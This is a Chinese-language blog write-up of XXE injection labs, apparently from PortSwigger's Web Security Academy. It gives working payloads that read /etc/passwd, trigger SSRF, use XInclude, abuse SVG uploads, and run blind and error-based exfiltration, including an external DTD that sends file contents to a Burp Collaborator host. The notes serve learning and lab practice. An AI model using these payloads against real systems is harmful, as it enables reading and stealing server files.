## 记XXE漏洞

###### @ShmilyChris

#### 0x00 外部实体注入

允许攻击者干扰应用程序对XML数据的处理，危害通常是查看服务器文件，与后端或者外部系统进行交互，某些情况下，还可以利用XXE执行SSRF攻击

------

#### 0x01 XML

- XML被设计用来传输和存储数据
- XML遵循树结构，且必须包含根元素
- XML必须有关闭标签，且标签对大小写敏感
- XML属性值必须加引号
- 构造完XML Poc可以先进行XSL验证检查有没有语法错误：
  - https://www.runoob.com/xml/xml-validator.html

------

#### 0x02 DTD

- DTD全称**文档类型定义**，可定义合法的XML文档构建模块

- 内部DOCTYPE声明

  - ```
    <?xml version="1.0"?>
    <!DOCTYPE note [
    <!ELEMENT note (to,from,heading,body)>
    <!ELEMENT to (#PCDATA)>
    <!ELEMENT from (#PCDATA)>
    <!ELEMENT heading (#PCDATA)>
    <!ELEMENT body (#PCDATA)>
    ]>
    <note>
    <to>Tove</to>
    <from>Jani</from>
    <heading>Reminder</heading>
    <body>Don't forget me this weekend</body>
    </note>
    ```

    - **!DOCTYPE note** (第二行)定义此文档是 **note** 类型的文档
    - **!ELEMENT note** (第三行)定义 **note** 元素有四个元素：to、from、heading、body
    - **!ELEMENT to** (第四行)定义 **to** 元素为 "#PCDATA" 类型
    - **!ELEMENT from** (第五行)定义 **from** 元素为 "#PCDATA" 类型
    - **!ELEMENT heading** (第六行)定义 **heading** 元素为 "#PCDATA" 类型
    - **!ELEMENT body** (第七行)定义 **body** 元素为 "#PCDATA" 类型

- 外部文档声明

  - `<!DOCTYPE root-element SYSTEM "filename">`

------

#### 0x03 XXE漏洞本质

**0x02**介绍了DTD外部文档声明，比如：

`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://xxxx.baidu.com" > ]>`

因此就存在构造Poc引发的XXE注入(file协议)：

`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>`

可以简单理解为，"外部文件包含"（双引号啊双引号，加了双引号啊）

------

#### 0x04 经典XXE

检查库存功能，POST的data数据为XML格式

![image-20220525125721547](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220525125721547.png)

构造Poc：

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
	<productId>
   	</productId>
    <storeId>
        2
    </storeId>
</stockCheck>
```

显示无效产品ID

![image-20220525130208683](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220525130208683.png)

重新构造Poc:

```xml-dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
	<productId>
1&xxe;/etc/passwd
   	</productId>
    <storeId>
        2
    </storeId>
</stockCheck>
```

![image-20220525130340811](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220525130340811.png)

这里有个问题，productldID：`1&1;/etc/passwd`都不行，只能是`1&xxe;/etc/passwd`，一开始没有弄明白，后来翻了一下，&xxe是引用上面!DOCTYPE的定义的意思

![image-20220525135625865](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220525135625865.png)

这里直接引用!DOCTYPE也能触发

![image-20220525135847593](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220525135847593.png)

------

#### 0x05 XXE SSRF

原理甚至Poc跟**0x04**的差不多，先介绍一下Burpsuite的客户端功能：`Burp->Burp Collaborator client`

![image-20220525140518260](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220525140518260.png)

点下`Copy to clipboard`会获取到一个链接：`gscj3w1topnse9l514qb7o6xbohf54.burpcollaborator.net`实际上可以比这个功能理解为dnslog，接下来构造Poc：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://oldrw4u1hxg07heducjj0wz54waoyd.burpcollaborator.net"> ]>
<stockCheck>
	<productId>
1&xxe;
   	</productId>
    <storeId>
        2
    </storeId>
</stockCheck>
```

返回burp客户端查看结果

![image-20220525140835661](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220525140835661.png)

通过一步步探测获取flag

![image-20220525142551202](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220525142551202.png)

![image-20220525142608420](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220525142608420.png)

------

#### 0x06 XXE XInclude

当不能自定义XML DTD的时候，就可以尝试这种方案，比如如下

![image-20220525144257305](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220525144257305.png)

构造Poc:

```xml-dtd
productId=2<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

![image-20220525144921396](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220525144921396.png)

稍微剖析下Poc，xmlns是XML的命名空间简称，即**xml namespace**，Poc中定义了一个命名空间，即`http://www.w3.org/2001/XInclude`，xmlns:xi中xi是命名前缀，是自定义的，如:`xmlns:lbwnb`,`xmlns:xi="http://www.w3.org/2001/XInclude"`的作用是告诉XML中所有元素的命名空间都是`http://www.w3.org/2001/XInclude`，而`xi:include`变相等于`http://www.w3.org/2001/XInclude/xi:include`

```xaml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

------

#### 0x07 文件上传XXE

![image-20220525152404346](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220525152404346.png)

构造<svg> Poc:

```xml
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

更改`Content-Type`为`application/x-www-form-urlencoded`或`text/xml`

![image-20220525152730319](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220525152730319.png)

由于没有限制直接作为头像上传上去了

![image-20220525152829685](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220525152829685.png)

头像就是flag

![image-20220525152844795](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220525152844795.png)

不仅是svg思路，常用的上传思路还有DOCX

------

#### 0x08 盲XXE(不允许包含常规外部实体的请求)

通过DNS服务器外带数据，Poc：

```xml
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://DNSLOG"> %xxe; ]>
```

![image-20220525153807809](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220525153807809.png)

收到请求证明能盲XXE再构造外带数据，先在服务器上生成个DTD文件(`&#x25;`是HTML实体编码，即%的意思)

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://g9qj5xp8uqhv3z58rbnq4apfm6sygn.burpcollaborator.net/?x=%file;'>">
%eval;
%exfil;
```

再通过构造Poc，访问服务器上的DTD文件

```XML
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-ac0b1fa51f991d5bc1b42e89010300cc.web-security-academy.net/exploit"> %xxe;]>
```

![image-20220525154957429](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220525154957429.png)

查看日志，获取到flag

![image-20220525155132848](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220525155132848.png)

------

#### 0x09 盲XXE通过报错外带数据

跟**0x08**类似，想了一下，单独开个**0x09**讲吧

服务器上新建一个DTD文件：

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

构造Poc：

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-ac071f711e38709ec0a7233601130039.web-security-academy.net/exploit"> %xxe;]>
```

触发报错，带出数据

![image-20220525155931835](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220525155931835.png)

------

#### 0x10 高价XXE(利用本地DTD检索数据)

先来了解一个文件，叫`docbookx.dtdISOamso`，默认路径为`/usr/share/yelp/dtd/docbookx.dtdISOamso.`，为GNOME 桌面环境的默认文件，

特殊Poc：导入Yelp DTD重新定义实体,触发包含文件内容的报错，带出数据

```xml
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

![image-20220525163640418](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220525163640418.png)
